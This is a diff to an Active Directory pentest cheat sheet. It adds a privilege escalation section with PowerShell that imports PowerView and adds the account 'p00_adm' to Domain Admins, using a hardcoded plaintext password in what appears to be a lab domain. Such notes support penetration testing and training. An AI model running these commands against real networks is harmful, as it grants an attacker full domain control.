@@ -129,7 +129,19 @@ Computers trusted for delegation can store TGTs of users who connect to them (wa
 ```powershell
     Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
 ```
-## 7. PowerView Exclusive Features (Situational Awareness)
+## 7. Privilege Escalation
+**Import PowerView.ps1**
+```powershell
+upload powerview.ps1
+Import-Module .\powerview.ps1
+```
+Add our account to Domain Admins group
+```powershell
+$pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
+```
+## 8. PowerView Exclusive Features (Situational Awareness)
 These features perform active network scanning or complex logic that the standard AD Module does not support.
 ### Share Finder (Network Noise Alert)
 Scans every computer in the domain for open SMB shares. Excellent for finding sensitive files.
